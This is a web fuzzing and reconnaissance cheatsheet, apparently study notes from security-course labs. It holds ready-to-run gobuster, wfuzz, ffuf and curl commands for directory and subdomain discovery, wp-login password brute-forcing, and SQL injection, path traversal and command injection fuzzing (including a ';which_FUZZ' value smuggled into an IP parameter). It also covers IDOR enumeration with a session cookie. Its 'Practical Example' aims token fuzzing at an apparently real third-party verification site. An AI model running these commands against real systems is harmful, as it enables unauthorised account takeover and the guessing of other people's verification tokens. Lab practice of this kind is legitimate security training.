# Web Fuzzing & Recon Cheatsheet

This cheat sheet contains **gobuster, wfuzz, and curl** commands for discovering directories, files, subdomains, parameters, and performing common web fuzzing tasks.

---

## 1. Endpoint / Directory Discovery

```bash
gobuster dir -u target.com -w /home/pwn/wordlists/common.txt -t 5 -b 301
```

```bash
gobuster dir -u http://asio -w /home/pwn/wordlists/common.txt
```

---

## 2. Subdomain Discovery

```bash
gobuster dns -d megacorpone.com -w /home/pwn/wordlists/subdomains-top1million-110000.txt -t 30
```

---

## 3. File Discovery (wfuzz)

```bash
wfuzz -c -z file,/home/pwn/wordlists/raft-medium-files.txt --hc 301,404,403 "http://example.com/FUZZ"
```

---

## 4. Directory Discovery (wfuzz)

```bash
wfuzz -c -z file,/home/pwn/wordlists/Web-Content/raft-medium-directories.txt --hc 404,403 "http://offsecwp:80/FUZZ/"
```

---

## 5. Parameter Discovery (wfuzz)

```bash
wfuzz -c -z file,/home/pwn/wordlists/Web-Content/burp-parameter-names.txt --hc 404,301 "http://offsecwp:80/index.php?FUZZ=data"
```

---

## 6. Fuzzing Parameter Values (wfuzz GET)

```bash
wfuzz -c -z file,/home/pwn/wordlists/cirt-default-usernames.txt --hc 404,301 http://offsecwp:80/index.php?fpv=FUZZ
```

---

## 7. Fuzzing POST Data (wfuzz)

### Without size filtering

```bash
wfuzz -c -z file,/home/pwn/wordlists/xato-net-10-million-passwords-100000.txt --hc 404 -d "log=admin&pwd=FUZZ" http://offsecwp:80/wp-login.php
```

### With size filtering

```bash
wfuzz -c -z file,/home/pwn/wordlists/xato-net-10-million-passwords-100000.txt --hc 404 -d "log=admin&pwd=FUZZ" --hh 6059 http://offsecwp:80/wp-login.php
```

---

## 8. SQL Injection Fuzzing

```bash
wfuzz -c -z file,/home/pwn/wordlists/SQL.txt -d "db=mysql&id=FUZZ" -u http://sql-sandbox/api/intro
```

---

## 9. LFI / Path Traversal Fuzzing

```bash
wfuzz -c -z file,/home/pwn/wordlists/LFI-Jhaddix.txt http://dirTraavSandbox:80/relativePath.php?path=../../../../../../../../../../FUZZ
```

```bash
wfuzz -c -z file,/home/pwn/wordlists/LFI-Jhaddix.txt --hc 404 --hn 81,125 http://dirTravSandbox/relativePathing.php?path=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../FUZZ
```

---

## 10. Command Injection

```bash
wfuzz -c -z file,/home/pwn/wordlists/capability_checks_custom.txt --hc 404 "http://cisandbox:80/php/index.php?ip=127.0.0.1;which_FUZZ"
```

---

## 11. IDOR / Random UID Fuzzing

```bash
curl -s /dev/null http://idor-sandbox:80/user/?uid=91191 -w '%{size_download}' --header "Cookie: PHPSESSID=acea3bfe134edc890a956eb44a0863cf"
```

```bash
wfuzz -c -z file,/home/pwn/wordlists/5-digits-00000-99999.txt --hc 404 --hh 2873 --H "Cookie: PHPSESSID=acea3bfe134edc890a95eb44a0863cf" http://idor-sandbox:80/user/?uid=FUZZ
```

---

# Fuzzing Notes - Response Size Filtering
## Why Filter by Response Size?
When fuzzing parameters, most responses return the same size (false positives). Valid tokens/endpoints return different sizes - this helps identify them.
## How to Find the Baseline Size
```bash
curl -s -I http://10.129.229.147 -H "HOST: defnotvalid.inlanefreight.local" | grep "Content-Length:"
```
## Tools & Examples
### 1. wfuzz - Filter by Size
```bash
# Hide responses with baseline size (30741)
wfuzz -c -z file,/home/pwn/wordlists/common.txt --hh 30741 "https://verified.clearme.com/verify?token=FUZZ"

# Show only responses with different size (smaller)
wfuzz -c -z file,/home/pwn/wordlists/common.txt --sh 0-1000 "https://target.com/endpoint?param=FUZZ"

# Filter by specific size range
wfuzz -c -z file,/wordlists/common.txt --sh 500-1000 "https://target.com/FUZZ"
```

**Flags:**
- `--hh N` = Hide responses with N chars
- `--sh N` = Show only responses with N chars
- `--sh N-M` = Show responses between N and M chars

### 2. ffuf - Filter by Size
```bash
# Filter by word count
ffuf -u "https://target.com/verify?token=FUZZ" -w wordlist.txt -fw 100

# Filter by response size in bytes
ffuf -u "https://target.com/verify?token=FUZZ" -w wordlist.txt -fs 30741

# Hide specific status codes + filter by size
ffuf -u "https://target.com/FUZZ" -w wordlist.txt -fc 404,403 -fs 5000
```

**Flags:**
- `-fw N` = Filter by word count
- `-fs N` = Filter by response size
- `-fc N` = Filter by status code
### 3. Common Wordlists
```
/home/pwn/wordlists/common.txt        # 4746 words
/usr/share/wordlists/dirb/common.txt  # Kali default
/usr/share/wordlists/dirbuster/       # Directory wordlists
```

## Practical Example - Token Fuzzing
```bash
# 1. Find baseline size
curl -s "https://verified.clearme.com/verify?token=x" | wc -c

# Output: 30741

# 2. Fuzz with size filter (hide baseline)
wfuzz -c -z file,common.txt --hh 30741 "https://verified.clearme.com/verify?token=FUZZ"

# 3. If POST required, try:
wfuzz -c -z file,common.txt --hc 404 -d "token=FUZZ" "https://verified.clearme.com/verify"
```

## Real-World Workflow
```bash
# Step 1: Baseline test
curl -s "https://target.com/login?code=INVALID" | wc -c

# 1234 chars

# Step 2: Fuzz filtering out baseline
wfuzz -c -z file,wordlist.txt --hh 1234 "https://target.com/login?code=FUZZ"

# Step 3: Any result with different size = potentially valid token
```

---

## Notes / Tips

* Use **`--hc`** to hide unwanted HTTP codes.
* Use **`--hh`** or **`--hn`** to hide pages by size or line count.
* Combine **wfuzz** with wordlists from SecLists for maximum coverage.
* Always copy your session cookie from Burp Suite if authentication is required.
